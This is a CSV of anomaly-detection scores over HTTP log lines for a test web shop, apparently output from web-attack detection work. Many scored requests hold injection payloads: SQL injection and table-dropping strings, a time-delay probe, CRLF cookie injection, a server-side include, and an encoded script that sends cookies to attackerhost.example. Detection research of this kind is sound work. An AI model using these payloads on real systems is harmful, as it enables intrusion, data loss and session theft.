score_content,score_session,score_fused,score_fused_norm,line
85.87369537353516,0.6059590578079224,43.23982721567154,43.23982721567154,localhost:8080 - - [10/Jan/2025:15:56:57 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=draper&password=empol721ar&nombre=Mercur-io&apellidos=San+Emeterio+Farzati&email=redfield-eckstine%40sorority.va&dni=51229909P&direccion=C%2F+Marte+50+3%3FH&ciudad=Salda%F1a&cp=37172&provincia=Ja%E9n&ntc=6892387186647118&B1=Registrar HTTP/1.1 HTTP/1.1" 200 939 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.6058384776115417,1.8369775712490082,1.8369775712490082,localhost:8080 - - [10/Jan/2025:15:56:58 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
87.26776885986328,0.6918380856513977,43.97980347275734,43.97980347275734,localhost:8080 - - [10/Jan/2025:15:56:58 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=draper&password=empol721ar&nombre=Jos%E9+Luis&apellidos=San+Emeterio+Farzati&email=redfield-eckstine%40sorority.va&dniA=51229909P&direccion=C%2F+Marte+50+3%3FH&ciudad=Salda%F1a&cp=37172&provincia=Ja%E9n&ntc=6892387186647118&B1=Registrar HTTP/1.1 HTTP/1.1" 200 948 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.6915638446807861,1.8798402547836304,1.8798402547836304,localhost:8080 - - [10/Jan/2025:15:56:58 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
33.093849182128906,0.698387861251831,16.89611852169037,16.89611852169037,localhost:8080 - - [10/Jan/2025:15:56:58 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A HTTP/1.1 HTTP/1.1" 200 453 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.6985915899276733,1.8511467576026917,1.8511467576026917,localhost:8080 - - [10/Jan/2025:15:56:59 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.10780143737793,0.698239266872406,12.403020352125168,12.403020352125168,localhost:8080 - - [10/Jan/2025:15:56:59 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%22+AND+%221%22%3D%221 HTTP/1.1 HTTP/1.1" 200 249 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.6988945007324219,1.851298213005066,1.851298213005066,localhost:8080 - - [10/Jan/2025:15:56:59 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.626134872436523,0.6527536511421204,12.139444261789322,12.139444261789322,localhost:8080 - - [10/Jan/2025:15:56:59 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.6534897089004517,1.8285958170890808,1.8285958170890808,localhost:8080 - - [10/Jan/2025:15:57:00 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.45507776737213135,0.6382820010185242,0.5466798841953278,0.5466798841953278,localhost:8080 - - [10/Jan/2025:15:57:00 +0000] "GET http://localhost:8080/6909030637832563290.jsp.INC HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.17681103944778442,0.6263028383255005,0.40155693888664246,0.40155693888664246,localhost:8080 - - [10/Jan/2025:15:57:00 +0000] "GET http://localhost:8080.bak HTTP/1.1 HTTP/1.1" 200 102 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.8139696717262268,0.6099001169204712,0.711934894323349,0.711934894323349,localhost:8080 - - [10/Jan/2025:15:57:00 +0000] "GET http://localhost:8080/tienda1/global/asf-logo-wide.gif.bak HTTP/1.1 HTTP/1.1" 200 201 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.2701284885406494,0.5911948680877686,1.430661678314209,1.430661678314209,localhost:8080 - - [10/Jan/2025:15:57:01 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.gif/.BAK HTTP/1.1 HTTP/1.1" 200 267 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
109.99609375,0.659380316734314,55.32773703336716,55.32773703336716,localhost:8080 - - [10/Jan/2025:15:57:01 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1 HTTP/1.1" 200 1083 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.6588358283042908,1.846945732831955,1.846945732831955,localhost:8080 - - [10/Jan/2025:15:57:01 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
86.8013916015625,0.748565137386322,43.77497836947441,43.77497836947441,localhost:8080 - - [10/Jan/2025:15:57:01 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=%27OR%27a%3D%27a&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar HTTP/1.1 HTTP/1.1" 200 945 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.7480461597442627,1.891550898551941,1.891550898551941,localhost:8080 - - [10/Jan/2025:15:57:02 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
84.03852081298828,0.834050178527832,42.43628549575806,42.43628549575806,localhost:8080 - - [10/Jan/2025:15:57:02 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=D%2Curazo+Buf%ED&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar HTTP/1.1 HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.8335770964622498,1.9343163669109344,1.9343163669109344,localhost:8080 - - [10/Jan/2025:15:57:02 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
84.03852081298828,0.8309037685394287,42.434712290763855,42.434712290763855,localhost:8080 - - [10/Jan/2025:15:57:02 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=Xim%E9nez+Alamo&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cpA=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar HTTP/1.1 HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.8306184411048889,1.932837039232254,1.932837039232254,localhost:8080 - - [10/Jan/2025:15:57:03 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5229076743125916,0.7229625582695007,0.6229351162910461,0.6229351162910461,localhost:8080 - - [10/Jan/2025:15:57:03 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp/~ HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0728569030761719,0.7037509083747864,0.8883039057254791,0.8883039057254791,localhost:8080 - - [10/Jan/2025:15:57:03 +0000] "GET http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.gif/ HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2184963822364807,0.6787282824516296,0.4486123323440552,0.4486123323440552,localhost:8080 - - [10/Jan/2025:15:57:03 +0000] "GET http://localhost:8080/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 144 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3105019330978394,0.6593832969665527,0.984942615032196,0.984942615032196,localhost:8080 - - [10/Jan/2025:15:57:04 +0000] "GET http://localhost:8080/tienda1/imagenes/logo.gif/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.7672879695892334,0.6434974074363708,0.7053926885128021,0.7053926885128021,localhost:8080 - - [10/Jan/2025:15:57:04 +0000] "GET http://localhost:8080/tienda1/6909030637832563290.jsp.old HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
378.60125732421875,1.1693912744522095,189.88532429933548,189.88532429933548,localhost:8080 - - [10/Jan/2025:15:57:04 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=34sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 2067 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,1.1727126836776733,2.0882073044776917,2.0882073044776917,localhost:8080 - - [10/Jan/2025:15:57:04 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
30.941919326782227,1.1786202192306519,16.06026977300644,16.06026977300644,localhost:8080 - - [10/Jan/2025:15:57:05 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 417 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,1.1967166662216187,2.1002092957496643,2.1002092957496643,localhost:8080 - - [10/Jan/2025:15:57:05 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.883872985839844,1.2124139070510864,15.048143446445465,15.048143446445465,localhost:8080 - - [10/Jan/2025:15:57:05 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precioA=39&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,1.2311376333236694,2.1174197793006897,2.1174197793006897,localhost:8080 - - [10/Jan/2025:15:57:05 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
41.508262634277344,1.2709254026412964,21.38959401845932,21.38959401845932,localhost:8080 - - [10/Jan/2025:15:57:06 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=boeyenany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=13st7l75n&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 567 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,1.1471076011657715,2.1432300806045532,2.1432300806045532,localhost:8080 - - [10/Jan/2025:15:57:06 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.59254264831543,1.1498034000396729,14.871173024177551,14.871173024177551,localhost:8080 - - [10/Jan/2025:15:57:06 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=boeyen&pwd=13st7l75n&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 372 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,1.0609186887741089,2.100135624408722,2.100135624408722,localhost:8080 - - [10/Jan/2025:15:57:06 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.39408108592033386,1.0431135892868042,0.718597337603569,0.718597337603569,localhost:8080 - - [10/Jan/2025:15:57:07 +0000] "GET http://localhost:8080/tienda1/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
26.986255645751953,0.9592350125312805,13.972745329141617,13.972745329141617,localhost:8080 - - [10/Jan/2025:15:57:07 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 336 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.9584409594535828,2.152843087911606,2.152843087911606,localhost:8080 - - [10/Jan/2025:15:57:07 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.56409454345703,0.8715797662734985,12.217837154865265,12.217837154865265,localhost:8080 - - [10/Jan/2025:15:57:07 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2500 HTTP/1.1 HTTP/1.1" 200 225 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.8710622787475586,2.1091537475585938,2.1091537475585938,localhost:8080 - - [10/Jan/2025:15:57:08 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.388172149658203,0.8868895173072815,12.137530833482742,12.137530833482742,localhost:8080 - - [10/Jan/2025:15:57:08 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.9055289626121521,2.1263870894908905,2.1263870894908905,localhost:8080 - - [10/Jan/2025:15:57:08 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.1646314412355423,0.9069794416427612,0.5358054414391518,0.5358054414391518,localhost:8080 - - [10/Jan/2025:15:57:08 +0000] "GET http://localhost:8080/homepage.nsf HTTP/1.1 HTTP/1.1" 200 129 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.44940757751465,0.9283643364906311,14.68888595700264,14.68888595700264,localhost:8080 - - [10/Jan/2025:15:57:09 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1 HTTP/1.1" 200 369 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.9477819800376892,1.9757419526576996,1.9757419526576996,localhost:8080 - - [10/Jan/2025:15:57:09 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.849061965942383,0.41706353425979614,12.63306275010109,12.63306275010109,localhost:8080 - - [10/Jan/2025:15:57:09 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.41723230481147766,1.7104671150445938,1.7104671150445938,localhost:8080 - - [10/Jan/2025:15:57:09 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.7223061323165894,0.39305731654167175,0.5576817244291306,0.5576817244291306,localhost:8080 - - [10/Jan/2025:15:57:10 +0000] "GET http://localhost:8080/tienda1/publico/asf-logo-wide.gif/ HTTP/1.1 HTTP/1.1" 200 195 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
35.072444915771484,0.40395182371139526,17.73819836974144,17.73819836974144,localhost:8080 - - [10/Jan/2025:15:57:10 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1517any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 483 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.4021267294883728,1.6880925595760345,1.6880925595760345,localhost:8080 - - [10/Jan/2025:15:57:10 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.94103240966797,0.4004923701286316,13.1707623898983,13.1707623898983,localhost:8080 - - [10/Jan/2025:15:57:10 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1517&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.38045743107795715,1.6772579103708267,1.6772579103708267,localhost:8080 - - [10/Jan/2025:15:57:11 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.222490310668945,0.37840574979782104,12.800448030233383,12.800448030233383,localhost:8080 - - [10/Jan/2025:15:57:11 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1517&B1A=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.37704071402549744,1.6755495518445969,1.6755495518445969,localhost:8080 - - [10/Jan/2025:15:57:11 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
118.32947540283203,0.5127343535423279,59.42110487818718,59.42110487818718,localhost:8080 - - [10/Jan/2025:15:57:11 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=xi-xian9%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&password=p%3Ferspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon%40ingenelec.gl&dni=10207822P&direccion=C%2F+Paloma%2C+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntc=3590940446144864&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1128 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.5301949381828308,1.7991558015346527,1.7991558015346527,localhost:8080 - - [10/Jan/2025:15:57:12 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
80.44894409179688,0.6089121103286743,40.528928101062775,40.528928101062775,localhost:8080 - - [10/Jan/2025:15:57:12 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=xi-xian9&password=p%3Ferspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon%40ingenelec.gl&dni=10207822P&direccion=C%2F+Paloma%2C+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntc=331994682613323&B1=Registrar HTTP/1.1 HTTP/1.1" 200 903 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.6090603470802307,1.8385885059833527,1.8385885059833527,localhost:8080 - - [10/Jan/2025:15:57:12 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
81.33625030517578,0.6922187209129333,41.01423451304436,41.01423451304436,localhost:8080 - - [10/Jan/2025:15:57:12 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=xi-xian9&password=p%3Ferspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon%40ingenelec.gl&dni=10207822P&direccion=C%2F+Paloma%2C+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntcA=3590940446144864&B1=Registrar HTTP/1.1 HTTP/1.1" 200 909 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.692323625087738,1.8802201449871063,1.8802201449871063,localhost:8080 - - [10/Jan/2025:15:57:13 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.39408108592033386,0.677341639995575,0.5357113629579544,0.5357113629579544,localhost:8080 - - [10/Jan/2025:15:57:13 +0000] "GET http://localhost:8080/tienda1/asf-logo-wide.Inc HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.626134872436523,0.6751158237457275,12.150625348091125,12.150625348091125,localhost:8080 - - [10/Jan/2025:15:57:13 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.6903982162475586,1.8470500707626343,1.8470500707626343,localhost:8080 - - [10/Jan/2025:15:57:13 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4881399869918823,0.6702563166618347,0.5791981518268585,0.5791981518268585,localhost:8080 - - [10/Jan/2025:15:57:14 +0000] "GET http://localhost:8080/tienda1/global/menum.jsp.BAK HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.951709747314453,0.7865864634513855,12.36914810538292,12.36914810538292,localhost:8080 - - [10/Jan/2025:15:57:14 +0000] "GET http://localhost:8080/?OpenServer HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.953901290893555,0.9076342582702637,12.43076777458191,12.43076777458191,localhost:8080 - - [10/Jan/2025:15:57:14 +0000] "GET http://localhost:8080/?Open HTTP/1.1 HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0728569030761719,0.8887867331504822,0.980821818113327,0.980821818113327,localhost:8080 - - [10/Jan/2025:15:57:14 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.java HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
